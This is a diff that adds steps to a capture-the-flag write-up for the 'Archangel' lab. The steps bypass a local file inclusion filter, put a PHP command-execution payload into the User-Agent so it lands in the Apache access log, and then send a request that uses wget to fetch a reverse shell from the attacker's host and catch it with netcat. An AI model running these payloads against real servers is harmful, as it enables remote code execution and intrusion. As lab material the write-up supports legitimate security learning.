@@ -36,10 +36,43 @@ curl -s http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/re
 
 above URL returns a base64 encoded string, decoding the string reveals code of `test.php`
 
+The code is checking that the 2 below conditions are met about the injected content:
+
+- it should not contain `../..`
+- it should contain `/var/www/html/development_testing`
+
+We can bypass the path traversal protection by replacing `../..` with `.././..`, as follows:
+
+```sh
+kali@kali:/data/Archangel$ curl -s http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log
+```
+
 From the access logs it can be seen that along with the path that we are trying to access our User-Agent is also getting logged. We can add a PHP code in the User-Agent header using Burp Suite and with the help of that gain a reverse shell.
 
+We’ll now poison the apache2 log file by injecting a PHP payload in the user-agent string as follows
+Now, let’s download a PHP reverse shell. Start by hosting it locally (`python3 -m http.server`) and download it by sending the following request in BurpSuite Repeater
 
+1. Add the following code somewhere in the `User-Agent` header value:
+    
+    ```html
+    <?php system($_GET['cmd']); ?>
+    ```
+    
+2. Append `&cmd=whoami` to the GET request. Here, all that we are doing is passing `whoami` string to the `cmd` variable would get processed by the PHP code in the User-Agent and we would get the output of the command in the logged User-Agent value in the `access.log` file.
 
+When you send the request for the first time, you won't see anything in the output because the command has just been executed and what you are viewing is the copy of log file before the output of your command was written to it. Therefore, you need to send the same request again so that the output written previous can now be viewed.
+
+start of the malicious burp request looks 
+```
+GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=wget%20http://10.8.**.**:8000/rev.php HTTP/1.1
+Host: mafialive.thm
+User-Agent: <?php system($_GET['cmd']); ?>
+```
+
+call the reverse shell on the server by browsing `http://mafialive.thm/rev.php` We now have a reverse shell:
+```sh
+rlwrap nc -nlvp 4444
+```
 
 
 
